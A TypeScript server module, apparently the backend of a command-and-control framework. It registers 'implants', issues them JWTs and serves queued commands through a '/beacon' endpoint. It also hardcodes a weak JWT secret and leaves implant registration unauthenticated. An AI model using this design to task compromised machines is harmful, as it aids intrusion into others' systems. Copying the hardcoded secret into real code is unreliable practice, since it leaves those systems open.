import { Elysia, t } from 'elysia';
import { eq } from 'drizzle-orm';
import { jwt } from '@elysiajs/jwt';

import { dbService } from './db';

export const implantService = new Elysia({ name: 'implant/service' })
  .use(dbService)
  .use(
    jwt({
      name: 'implantJWT',
      secret: 'implent JWT secret',
      schema: t.Object({ id: t.Number() }),
    }),
  );

export const implant = new Elysia({ prefix: '/implants' })
  .use(implantService)
  .get(
    '/',
    async ({ db }) => {
      const implants = await db.query.implants.findMany();
      return implants;
    },
    {
      isSignIn: true,
    },
  )
  .get(
    '/:id',
    async ({ error, params: { id }, db }) => {
      const implant = await db.query.implants.findFirst({
        where: (implants, { eq }) => eq(implants.id, id),
      });

      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }
      return {
        success: true,
        message: 'Implant found',
        implant,
      };
    },
    { params: t.Object({ id: t.Number() }), isSignIn: true },
  )
  .post('/', async ({ implantJWT, db, schema }) => {
    const implant = (
      await db.insert(schema.implants).values({}).returning()
    )[0];

    const token = await implantJWT.sign({ id: implant.id });

    return {
      success: true,
      message: 'Implant created',
      token,
      implant,
    };
  })
  .get(
    '/beacon',
    async ({ implantJWT, headers: { authorization }, error, db, schema }) => {
      const jwtPayload = await implantJWT.verify(authorization);

      if (jwtPayload == false) {
        return error(401, { success: false, message: 'Unauthorized' });
      }

      const implantId = jwtPayload.id;
      const implant = await db.query.implants.findFirst({
        where: (implants, { eq }) => eq(implants.id, implantId),
        with: {
          commands: {
            where: (commands, { eq }) => eq(commands.status, 'Queued'),
            orderBy: (commands, { asc }) => [asc(commands.createdAt)],
          },
        },
      });
      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }

      await db
        .update(schema.implants)
        .set({
          lastSeenAt: new Date(),
        })
        .where(eq(schema.implants.id, implant.id));

      return {
        success: true,
        message: 'Implant updated',
        implant,
      };
    },
    {
      headers: t.Object({ authorization: t.String() }),
    },
  );
